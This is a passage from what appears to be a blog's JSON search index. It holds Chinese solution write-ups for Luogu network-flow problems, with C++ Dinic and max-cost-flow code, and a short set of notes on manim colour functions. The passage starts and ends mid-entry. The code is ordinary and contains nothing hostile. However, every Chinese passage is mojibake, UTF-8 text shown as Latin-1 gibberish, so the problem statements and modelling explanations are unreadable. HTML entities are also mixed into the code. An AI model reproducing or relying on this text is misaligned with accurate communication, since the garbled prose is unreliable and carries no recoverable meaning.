æºç‚¹ å‘ èŠ‚ç‚¹1 æ¥ä¸€æ¡ å®¹é‡ä¸º$k$,è´¹ç”¨ä¸º$0$ çš„è¾¹(æœ€å¤§å®¹é‡ä¸ºk,å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æ¯ä¸ªèŠ‚ç‚¹$i$ å‘ èŠ‚ç‚¹$i+1$ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$0$ çš„è¾¹(å¯ä»¥éšæ„é€šè¿‡,å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æœ€åä¸€ä¸ªèŠ‚ç‚¹ å‘ æ±‡ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$0$ çš„è¾¹(æ€»æµé‡æœ‰1.æ§åˆ¶,å¯¹ç­”æ¡ˆæ— è´¡çŒ®)(å¯ä»¥åŒ…å«åœ¨2.é‡Œ) ä» æ¯ä¸ªåŒºé—´çš„å·¦ç«¯ç‚¹ å‘ å…¶å³ç«¯ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸ºåŒºé—´é•¿ çš„è¾¹(åªå¯ç”¨ä¸€æ¬¡,å¯¹ç­”æ¡ˆè´¡çŒ®ä¸ºåŒºé—´é•¿åº¦) æ±‚å‡ºæœ€å¤§è´¹ç”¨æœ€å¤§æµ,æœ€å¤§è´¹ç”¨å³ä¸ºæœ€ç»ˆçš„ç»“æœæ ·ä¾‹çš„å›¾å¦‚ä¸‹: ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 2010;const int inf = 0x3f3f3f3f;const int ninf = 0xc0c0c0c0;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { memset(d, 0xc0, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &lt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == ninf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MaxCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}struct Interval { int l, r, len;}inter[510];int nums[1020], old[1020];int main() { int n_ = read(), k = read(); for (int i = 1; i &lt;= n_; ++i) { inter[i].l = read(); inter[i].r = read(); inter[i].len = inter[i].r - inter[i].l; nums[i * 2 - 1] = inter[i].l; nums[i * 2] = inter[i].r; } for (int i = 1; i &lt;= n_ * 2; ++i) old[i] = nums[i]; sort(old + 1, old + 1 + n_ * 2); int len = unique(old + 1, old + 1 + n_ * 2) - old - 1; for (int i = 1; i &lt;= n_ * 2; ++i) nums[i] = lower_bound(old + 1, old + 1 + len, nums[i]) - old; for (int i = 1; i &lt;= n_; ++i) { inter[i].l = nums[i * 2 - 1]; inter[i].r = nums[i * 2]; } s = 0; n = len + 2; t = n - 1; add(s, 1, k, 0); for (int i = 1; i &lt;= len; ++i) { add(i, i + 1, inf, 0); } for (int i = 1; i &lt;= n_; ++i) { add(inter[i].l, inter[i].r, 1, inter[i].len); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%d\\n&quot;, anscost); return 0;}","link":"/p/949e7ebf.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€ç«æ˜Ÿæ¢é™©é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P3356ã€ç«æ˜Ÿæ¢é™©é—®é¢˜ é¢˜ç›®å¤§æ„æœ‰$n$è¾†è½¦,$p\\times q$çš„ç½‘æ ¼ä¸º0å¯ä»¥é€šè¿‡,1æœ‰éšœç¢ä¸èƒ½é€šè¿‡,2ä¸ºå²©çŸ³å¯ä»¥é‡‡é›†ä»(1, 1)å¼€å§‹åˆ°æœ€å³ä¸‹è§’,åªèƒ½å‘å³æˆ–å‘ä¸‹ æ±‚å‡ºä½¿åˆ°è¾¾ç»ˆç‚¹çš„è½¦æœ€å¤š,è€Œä¸”é‡‡é›†çš„å²©çŸ³æœ€å¤šçš„ç§»åŠ¨æ–¹æ¡ˆ é¢˜è§£å°†æ¯ä¸ªä½ç½®æ‹†æˆå…¥ç‚¹å’Œå‡ºç‚¹ å¦‚æœè¿™ä¸ªä½ç½®æ˜¯$0$æˆ–$2$, åˆ™ä» å…¥ç‚¹ å‘ å‡ºç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$, è´¹ç”¨ä¸º$0$ çš„è¾¹ å¦‚æœè¿™ä¸ªä½ç½®æ˜¯$2$, åˆ™ä» å…¥ç‚¹ å‘ å‡ºç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$, è´¹ç”¨ä¸º$1$ çš„è¾¹ å¦‚æœè¿™ä¸ªä½ç½®$u$çš„å³è¾¹$v$æ˜¯ä¸æ˜¯$1$, åˆ™ä» $u$çš„å‡ºç‚¹ å‘ $v$çš„å…¥ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$, è´¹ç”¨ä¸º$0$ çš„è¾¹ å¦‚æœè¿™ä¸ªä½ç½®$u$çš„ä¸‹è¾¹$v$æ˜¯ä¸æ˜¯$1$, åˆ™ä» $u$çš„å‡ºç‚¹ å‘ $v$çš„å…¥ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$, è´¹ç”¨ä¸º$0$ çš„è¾¹ è·‘æœ€å¤§è´¹ç”¨æœ€å¤§æµ,æœ€å¤§æµæ•°å³åˆ°è¾¾ç»ˆç‚¹æœ€å¤šçš„è½¦æ•°è¾“å‡ºæ–¹æ¡ˆä½¿ç”¨dfs,åœ¨æµé‡ç½‘ç»œä¸­æœç´¢è¾“å‡ºè·¯å¾„ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 4010;const int inf = 0x3f3f3f3f;const int ninf = 0xc0c0c0c0;int n, m, s, t, ansflow;int vis[maxn], d[maxn], pre[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { memset(d, 0xc0, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; pre[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &lt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; pre[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == ninf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[pre[u]].from) { edges[pre[u]].flow += a[t]; edges[pre[u] ^ 1].flow -= a[t]; } return true;}int MaxCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}int p, q;int in[40][40];int point(int x, int y) { return (x - 1) * p + y;}void dfs(int x, int y, int u, int id) { for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; Edge&amp; ne = edges[G[u][i] ^ 1]; if (e.to == s || e.to == t || e.to == u - n) continue; if (!e.flow) continue; e.flow--; if (e.to &gt; n) { dfs(x, y, e.to, id); return; } int nx, ny, dir; if (e.to == point(x, y) + 1) { nx = x; ny = y + 1; dir = 1; } else { nx = x + 1; ny = y; dir = 0; } printf(&quot;%d %d\\n&quot;, id, dir); dfs(nx, ny, e.to + n, id); return; }}int main() { int c = read(); p = read(); q = read(); n = p * q; s = 0; t = 2 * n + 1; for (int i = 1; i &lt;= q; ++i) { for (int j = 1; j &lt;= p; ++j) { in[i][j] = read(); if (in[i][j] == 0) add(point(i, j), point(i, j) + n, inf, 0); if (in[i][j] == 2) { add(point(i, j), point(i, j) + n, inf, 0); add(point(i, j), point(i, j) + n, 1, 1); } } } if (in[1][1] != 1) add(s, 1, c, 0); for (int i = 1; i &lt;= q; ++i) { for (int j = 1; j &lt;= p; ++j) { if (in[i][j] == 1) continue; if (in[i][j + 1] != 1 &amp;&amp; j + 1 &lt;= p) add(point(i, j) + n, point(i, j + 1), inf, 0); if (in[i + 1][j] != 1 &amp;&amp; i + 1 &lt;= q) add(point(i, j) + n, point(i + 1, j), inf, 0); } } if (in[q][p] != 1) add(point(q, p) + n, t, c, 0); ansflow = MaxCostMaxFlow(anscost); // printf(&quot;%d %d\\n&quot;, ansflow, anscost); for (int i = 1; i &lt;= ansflow; ++i) { dfs(1, 1, 1, i); } return 0;}","link":"/p/e7256d1.html"},{"title":"manimæ•™ç¨‹ç³»åˆ—-é¢œè‰² ç¬”è®°","text":"è¿™ç¯‡æ–‡ç« æ˜¯åœ¨å†™ manimæ•™ç¨‹ç³»åˆ—è§†é¢‘ çš„ é¢œè‰² éƒ¨åˆ†æ—¶åšçš„ä¸€äº›ç¬”è®°,åŒ…æ‹¬ æ•´ä¸ªè§†é¢‘çš„ç»“æ„ å’Œ å†™ä»£ç æ—¶äº†è§£çš„ä¸€äº›ç”¨æ³•çš„ç¬”è®°è§†é¢‘å·²ç»å‘å¸ƒ,åœ°å€:BV1vZ4y1x7hT è§†é¢‘ç»“æ„å¤§çº² å¼€å¤´ å¼€å§‹,æ ‡é¢˜,å±•ç¤ºæ‰€æœ‰è¦å°†çš„æ–¹æ³• é¢œè‰²çš„è¡¨ç¤º æ‰€æœ‰constants.pyä¸­çš„é¢œè‰²å¸¸é‡ ä½¿ç”¨hexè¡¨ç¤ºé¢œè‰² ä½¿ç”¨rgbçš„ndarrayè¡¨ç¤ºé¢œè‰² é¢œè‰²ä¹‹é—´çš„è½¬æ¢ rgb_to_hex hex_to_rgb color_to_rgb rgb_to_color color_to_int_rgb é¢œè‰²çš„è¿ç®—å‡½æ•° invert_color color_gradient interpolate_color average_color random_color è®¾ç½®é¢œè‰² Mobjectç•¥,ä¸€èˆ¬ä¸Šè‰²çš„éƒ½ä¸ºVMobject coloråˆ†ä¸ºstroke_colorå’Œfill_color ä¼ å…¥color, stroke_color, fill_color set_color, set_stroke, set_fillæ–¹æ³•çš„colorå’Œopacity ç»™å­ç‰©ä½“ä¸Šè‰² set_color set_color_by_gradient set_colors_by_radial_gradient å…‰æ³½ä¸æ¸å˜è‰² set_sheen set_colorä¸­ä½¿ç”¨åˆ—è¡¨è¾¾åˆ°æ¸å˜è‰² ä¸€äº›ç è§†é¢‘æ—¶çš„ç¬”è®° isinstanceå‡½æ•°æ£€æµ‹å¯¹è±¡çš„ç±»å‹ å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œformatæ—¶,æƒ³è¦ç”¨ç©ºæ ¼è¡¥é½å·¦è¾¹åˆ°ä¸€å®šä¸ªæ•°,å¯ä»¥ä½¿ç”¨str(...).rjust(num) æ¶‰åŠåˆ°TransformTextçš„åœ°æ–¹,åœ¨Texté‡Œé¢ä¸å¯ä»¥æœ‰ç©ºæ ¼,éœ€è¦ç”¨ç™½è‰²çš„~æ¥åšå‡ºä¼ªç©ºæ ¼ å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä¸€ä¸ªå­—ç¬¦çš„ä¸‹æ ‡å¯ä»¥ç”¨.index(&quot; &quot;, beg=..., end=...)æ–¹æ³•æ¥æŸ¥æ‰¾ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®,ç¬¬äºŒæ¬¡å‡ºç°éœ€è¦ä¼ å…¥begä¸ºç¬¬ä¸€æ¬¡ä½ç½®+1 manimçš„rgb_to_colorå‡½æ•°ä¼ å…¥çš„rgbçš„å€¼ä¸º01,ä¸æ˜¯0255 ç”¨forå¾ªç¯éå†å­—å…¸é”®å€¼å¯¹for key, value in dic.items():,éå†å…¶ä¸­ä¸€éƒ¨åˆ†for key, value in list(dic.items())[1:3]å°†é”®å€¼å¯¹è½¬åŒ–ä¸ºåˆ—è¡¨,å¹¶ç”¨åˆ‡ç‰‡ Arrowçš„ç®­å¤´ä¸º.tip .keys(),.values()ä¸ä¸ºåˆ—è¡¨,éœ€è¦å¥—åœ¨list()é‡Œé¢ set_colors_by_radial_gradientåˆ©ç”¨ä¸­å¿ƒä¸centerçš„è·ç¦»å¯¹é¢œè‰²è¿›è¡Œæ’å€¼,radiuså¤–çš„æ‰€æœ‰å­ç‰©ä½“å…¨ä¸ºouter_coloré¢œè‰² å«æœ‰sheen_factorçš„ç‰©ä½“è®¾ç½®æ¸å˜è‰²åä¸sheen_factoræ— å…³","link":"/p/2e2c9a7.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€éª‘å£«å…±å­˜é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P3355ã€éª‘å£«å…±å­˜é—®é¢˜ é¢˜ç›®å¤§æ„ç»™å‡º$n\\times n$çš„æ£‹ç›˜,$m$ä¸ªéšœç¢(éª‘å£«ä¸èƒ½æ”¾ç½®)æ±‚æœ€å¤šå¯ä»¥æ”¾å¤šå°‘ä¸ªéª‘å£«,ä¸èƒ½äº’ç›¸æ”»å‡» é¢˜è§£å…ˆå¯¹æ£‹ç›˜è¿›è¡Œé»‘ç™½äºŒæŸ“è‰²,$x+y$ä¸ºå¥‡æ•°å’Œå¶æ•°ä¸ºé»‘å’Œç™½,æ±‚äºŒåˆ†å›¾æœ€å¤§ç‹¬ç«‹é›† ä» æºç‚¹ å‘ é»‘è‰²èŠ‚ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹ ä» ç™½è‰²èŠ‚ç‚¹ å‘ æ±‡ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹ ä» æ¯ä¸ªé»‘è‰²èŠ‚ç‚¹ å‘ å…¶èƒ½æ”»å‡»åˆ°çš„ç™½è‰²èŠ‚ç‚¹æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$ çš„è¾¹ æ±‚å‡ºæœ€å°å‰²å³æœ€å¤§æµ,ç»“æœä¸º$\\mathtt{n\\times n - m - maxflow}$ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 40010;const int inf = 0x3f3f3f3f;const int go[8][2] = { {-1, 2}, {1, 2}, {-1, -2}, {1, -2}, {2, -1}, {2, 1}, {-2, -1}, {-2, 1}};int n, m, s, t, d[maxn], cur[maxn];struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int dinic(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, inf); } return flow;}int point(int x, int y) { return (x - 1) * n + y;}bool valid[210][210];int main() { n = read(); m = read(); s = 0; t = n * n + 1; for (int i = 1; i &lt;= m; ++i) { int x = read(), y = read(); valid[x][y] = true; } for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { if ((i + j) &amp; 1) { if (!valid[i][j]) { add(s, point(i, j), 1); } } else { if (!valid[i][j]) { add(point(i, j), t, 1); } } } } for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { if (!((i + j) &amp; 1)) continue; for (int k = 0; k &lt; 8; ++k) { int nx = i + go[k][0]; int ny = j + go[k][1]; if (1 &lt;= nx &amp;&amp; nx &lt;= n &amp;&amp; 1 &lt;= ny &amp;&amp; ny &lt;= n &amp;&amp; !valid[nx][ny]) { add(point(i, j), point(nx, ny), inf); } } } } int maxflow = dinic(s, t); printf(&quot;%d\\n&quot;, n * n - m - maxflow); return 0;}","link":"/p/11da5c27.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€åœ†æ¡Œé—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P3254ã€åœ†æ¡Œé—®é¢˜ é¢˜ç›®å¤§æ„æœ‰$m$ä¸ªå•ä½,$n$ä¸ªé¤æ¡Œç¬¬$i$ä¸ªå•ä½çš„ä»£è¡¨äººæ•°$r_i$, ç¬¬$i$å¼ é¤æ¡Œèƒ½å®¹çº³çš„äººæ•°$c_i$åŒä¸€ä¸ªå•ä½çš„ä»£è¡¨ä¸èƒ½åœ¨åŒä¸€ä¸ªé¤æ¡Œ è‹¥æœ‰ä¸€ç§æ–¹æ¡ˆ,è¾“å‡º$1$,å¹¶è¾“å‡ºæ–¹æ¡ˆè‹¥æ²¡æœ‰æ–¹æ¡ˆ,è¾“å‡º$0$ é¢˜è§£äºŒåˆ†å›¾,å·¦ç‚¹é›†ä¸ºå•ä½,å³ç‚¹é›†ä¸ºé¤æ¡Œ,æ±‚å…¶ æœ€å¤§åŒ¹é… å¯¹äºæ¯ä¸ªå•ä½,ä» è¿™ä¸ªç‚¹ å‘ æ‰€æœ‰é¤æ¡Œ æ¥ä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹(å³æ¯ä¸ªé¤æ¡Œåªèƒ½å®¹çº³åŒä¸€ä¸ªå•ä½çš„ä¸€ä¸ªäºº) ä» æºç‚¹ å‘ æ¯ä¸ªå•ä½ æ¥ä¸€æ¡ å®¹é‡ä¸ºå•ä½äººæ•° çš„è¾¹(å³æ¯ä¸ªå•ä½æ‰€æœ‰äººéƒ½è¦å‚åŠ ) ä» æ¯ä¸ªé¤æ¡Œ å‘ æ±‡ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸ºé¤æ¡Œäººæ•° çš„è¾¹ å¦‚æœæœ€å¤§æµå’Œæ‰€æœ‰å•ä½æ€»äººæ•°ç›¸ç­‰,åˆ™æœ‰å¯è¡Œæ–¹æ¡ˆå¯¹äºæ¯ä¸ªå•ä½,è¾“å‡ºå‡ºè¾¹æ»¡è¶³$\\mathtt{e.cap == e.flow}$çš„$\\mathtt{e.to-m}$ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 450;const int inf = 0x3f3f3f3f;int n, m, s, t, d[maxn], cur[maxn];struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int dinic(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, inf); } return flow;}int tot;int main() { m = read(); n = read(); s = 0; t = m + n + 1; for (int i = 1; i &lt;= m; ++i) { for (int j = 1; j &lt;= n; ++j) { add(i, j + m, 1); } } for (int i = 1; i &lt;= m; ++i) { int r = read(); tot += r; add(s, i, r); } for (int i = 1; i &lt;= n; ++i) { int c = read(); add(i + m, t, c); } int maxflow = dinic(s, t); if (maxflow == tot) { printf(&quot;1\\n&quot;); for (int u = 1; u &lt;= m; ++u) { for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; if (e.to != s &amp;&amp; e.cap == e.flow) { printf(&quot;%d &quot;, e.to - m); } } printf(&quot;\\n&quot;); } } else { printf(&quot;0\\n&quot;); } return 0;}","link":"/p/25e68a12.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æ–¹æ ¼å–æ•°é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2774ã€æ–¹æ ¼å–æ•°é—®é¢˜ é¢˜ç›®å¤§æ„$m$è¡Œ$n$åˆ—çš„æ–¹æ ¼å›¾,æ¯ä¸ªæ–¹æ ¼ä¸­æœ‰ä¸€ä¸ªæ­£æ•´æ•°ä»æ–¹æ ¼ä¸­å–æ•°,ä»»æ„ä¸¤ä¸ªæ•°æ‰€åœ¨æ–¹æ ¼æ²¡æœ‰å…¬å…±è¾¹æ±‚å–å‡ºçš„æ•°çš„æœ€å¤§æ€»å’Œ é¢˜è§£å…ˆé€‰æ‹©æ‰€æœ‰æ–¹æ ¼,ç„¶åè€ƒè™‘åˆ å»ä¸€äº›æ–¹æ ¼ç›¸é‚»$-&gt;$å¥‡å¶æ€§ä¸åŒ,æ„æˆä¸€ä¸ªäºŒåˆ†å›¾,å«æœ‰ä¸¤ä¸ªç‚¹é›† ä» æºç‚¹ å‘ ç‚¹é›†$A$ æ¥ä¸€æ¡ å®¹é‡ä¸ºç‚¹æƒ çš„è¾¹ ä» ç‚¹é›†$B$ å‘ æ±‡ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸ºç‚¹æƒ çš„è¾¹ ä» ç‚¹é›†$A$ä¸­æ¯ä¸ªç‚¹ å‘ ä¸å…¶ç›¸é‚»çš„åœ¨ç‚¹é›†$B$ä¸­çš„ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$ çš„è¾¹(ä¿è¯ä¸è¢«å‰²) æ±‚å‡ºæœ€å°å‰²å³æœ€å¤§æµå³å¯ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 10010;const int inf = 0x3f3f3f3f;const int go[4][2] = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};int n, m, s, t, d[maxn], cur[maxn], tot;struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int dinic(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, inf); } return flow;}int point(int x, int y) { return (x - 1) * n + y;}int main() { m = read(); n = read(); s = 0; t = n * m + 1; for (int i = 1; i &lt;= m; ++i) { for (int j = 1; j &lt;= n; ++j) { int a = read(); tot += a; if ((i + j) % 2 == 0) { add(s, point(i, j), a); for (int k = 0; k &lt; 4; ++k) { int nx = i + go[k][0]; int ny = j + go[k][1]; if (1 &lt;= nx &amp;&amp; nx &lt;= m &amp;&amp; 1 &lt;= ny &amp;&amp; ny &lt;= n) { add(point(i, j), point(nx, ny), inf); } } } else { add(point(i, j), t, a); } } } int maxflow = dinic(s, t); printf(&quot;%d\\n&quot;, tot - maxflow); return 0;}","link":"/p/40e04941.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€èˆªç©ºè·¯çº¿é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2770ã€èˆªç©ºè·¯çº¿é—®é¢˜ é¢˜ç›®å¤§æ„ç»™å‡ºä¸€ä¸ªåŸå¸‚,$n$ä¸ªç‚¹,$v$æ¡è¾¹,æ¯ä¸ªåŸå¸‚æœ‰ä¸€ä¸ªåå­—ä»è¥¿å‘ä¸œæŒ‰åºç»™å‡ºåå­—æ±‚ä»æœ€è¥¿å‡ºå‘åˆ°è¾¾æœ€ä¸œå¹¶è¿”å›æœ€è¥¿(é™¤èµ·ç‚¹å¤–,æ¯ä¸ªåŸå¸‚åªèƒ½è®¿é—®ä¸€æ¬¡)çš„è·¯å¾„ é¢˜è§£å°†æ¯ä¸ªåŸå¸‚æ‹†æˆå…¥ç‚¹å’Œå‡ºç‚¹ æºç‚¹ä¸ºç‚¹1çš„å…¥ç‚¹,æ±‡ç‚¹ä¸ºç‚¹nçš„å‡ºç‚¹ å¯¹äº é™¤æºç‚¹æ±‡ç‚¹ çš„æ¯ä¸ªç‚¹, ä» å…¥ç‚¹ å‘ å‡ºç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º1,è´¹ç”¨ä¸º1 çš„è¾¹(åªèƒ½ç»è¿‡ä¸€æ¬¡,ä¸”å¯¹ç­”æ¡ˆè´¡çŒ®ä¸º1) ä» ç‚¹1çš„å…¥ç‚¹ å‘ ç‚¹1çš„å‡ºç‚¹ å»ºä¸€æ¡ 